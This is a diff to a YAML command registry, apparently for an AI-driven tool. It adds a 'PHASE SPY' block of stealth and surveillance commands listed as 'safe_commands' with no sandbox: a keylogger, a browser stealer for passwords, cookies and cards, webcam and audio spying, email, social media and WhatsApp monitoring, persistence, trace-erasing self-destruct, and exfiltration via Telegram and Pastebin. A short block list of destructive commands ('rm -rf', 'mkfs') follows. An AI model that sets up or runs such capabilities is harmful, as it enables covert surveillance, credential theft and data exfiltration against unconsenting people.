@@ -815,6 +815,149 @@ safe_commands:
     requires_confirmation: false
     sandbox_required: false
 
+  # PHASE SPY: Stealth & Surveillance Features
+  stealth:
+    description: "Stealth mode — process masquerading"
+    requires_confirmation: false
+    sandbox_required: false
+  persistence:
+    description: "Install/remove/cek persistence (systemd, crontab, autostart, bashrc)"
+    requires_confirmation: true
+    sandbox_required: false
+  self_destruct:
+    description: "Panic & self-destruct — hapus jejak, logs, config"
+    requires_confirmation: true
+    sandbox_required: false
+  panic:
+    description: "Alias self_destruct"
+    requires_confirmation: true
+    sandbox_required: false
+  arp:
+    description: "Lihat ARP table (LAN devices)"
+    requires_confirmation: false
+    sandbox_required: false
+  routing:
+    description: "Lihat routing table"
+    requires_confirmation: false
+    sandbox_required: false
+  route:
+    description: "Alias routing"
+    requires_confirmation: false
+    sandbox_required: false
+  dns:
+    description: "Lihat konfigurasi DNS"
+    requires_confirmation: false
+    sandbox_required: false
+  net_recon:
+    description: "Network reconnaissance lengkap (ARP, routing, DNS, ports)"
+    requires_confirmation: false
+    sandbox_required: false
+  recon:
+    description: "Alias net_recon"
+    requires_confirmation: false
+    sandbox_required: false
+  wifi_surveillance:
+    description: "Wi-Fi surveillance — scan, known networks, tracking"
+    requires_confirmation: false
+    sandbox_required: false
+  wifispy:
+    description: "Alias wifi_surveillance"
+    requires_confirmation: false
+    sandbox_required: false
+  connections:
+    description: "Connection logger — snapshot/start/stop/export"
+    requires_confirmation: false
+    sandbox_required: false
+  conn:
+    description: "Alias connections"
+    requires_confirmation: false
+    sandbox_required: false
+  keylogger:
+    description: "Keylogger — start/stop/status/export/stats"
+    requires_confirmation: true
+    sandbox_required: false
+  keylog:
+    description: "Alias keylogger"
+    requires_confirmation: true
+    sandbox_required: false
+  browser_history:
+    description: "Browser spy — history, bookmarks, downloads"
+    requires_confirmation: false
+    sandbox_required: false
+  histori:
+    description: "Alias browser_history"
+    requires_confirmation: false
+    sandbox_required: false
+  steal:
+    description: "Browser stealer — cookies, passwords, cards, autofill, extensions"
+    requires_confirmation: false
+    sandbox_required: false
+  social_spy:
+    description: "Social media activity monitor"
+    requires_confirmation: false
+    sandbox_required: false
+  sosmed:
+    description: "Alias social_spy"
+    requires_confirmation: false
+    sandbox_required: false
+  email_spy:
+    description: "Email monitoring — Thunderbird/Evolution"
+    requires_confirmation: false
+    sandbox_required: false
+  email:
+    description: "Alias email_spy"
+    requires_confirmation: false
+    sandbox_required: false
+  audio_surveillance:
+    description: "Audio surveillance — rekam/ambient monitoring"
+    requires_confirmation: false
+    sandbox_required: false
+  webcam_surveillance:
+    description: "Webcam surveillance — motion detection, interval capture"
+    requires_confirmation: false
+    sandbox_required: false
+  camspy:
+    description: "Alias webcam_surveillance"
+    requires_confirmation: false
+    sandbox_required: false
+  collect:
+    description: "Data collection — auto/history/screenshots"
+    requires_confirmation: false
+    sandbox_required: false
+  kumpul:
+    description: "Alias collect"
+    requires_confirmation: false
+    sandbox_required: false
+  exfil:
+    description: "Exfiltrate data via Telegram/Pastebin"
+    requires_confirmation: true
+    sandbox_required: false
+  exfiltrate:
+    description: "Alias exfil"
+    requires_confirmation: true
+    sandbox_required: false
+  intel:
+    description: "AI intel report & user behavior analysis"
+    requires_confirmation: false
+    sandbox_required: false
+  laporan:
+    description: "Alias intel"
+    requires_confirmation: false
+    sandbox_required: false
+  alert:
+    description: "Smart alert — set/get/delete/silence"
+    requires_confirmation: false
+    sandbox_required: false
+
+  wa:
+    description: "WhatsApp Spy — check/monitor online status kontak via WhatsApp Web"
+    requires_confirmation: false
+    sandbox_required: false
+  whatsapp:
+    description: "Alias wa"
+    requires_confirmation: false
+    sandbox_required: false
+
 blocked_patterns:
   - "rm -rf"
   - "mkfs"
